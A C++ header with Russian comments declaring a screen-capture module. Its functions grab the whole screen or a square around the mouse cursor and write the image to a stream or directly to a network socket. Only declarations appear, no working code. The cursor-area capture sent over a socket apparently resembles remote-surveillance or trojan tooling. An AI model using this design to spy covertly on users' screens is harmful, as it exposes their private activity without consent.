/*
  Создание скриншота.
*/
#pragma once

namespace Screenshoot
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Запись скриншота экрана в IStream.

    IN mimeType - формат изображения.
    IN quality  - качество картинки в процентах (только JPEG).
    IN rect     - размер стороны квадрата вокруг курсора, или 0 - для создание скриншота всего
                  экрана.

    Return      - IStream - в случаи успеха,
                  NULL    - в случаи ошибки.
  */
  IStream *_screenToIStream(LPWSTR mimeType, DWORD quality, WORD rect);

  /*
    Запись скриншота экрана в сокет.

    IN s        - сокет.
    IN mimeType - формат изображения.
    IN quality  - качество картинки в процентах (только JPEG).
    IN rect     - размер стороны квадрата вокруг курсора, или 0 - для создание скриншота всего
                  экрана.

    Return      - true  - в случаи успеха,
                  false - в случаи ошибки.
  */
  bool _screenToSocket(SOCKET s, LPWSTR mimeType, DWORD quality, WORD rect);
};
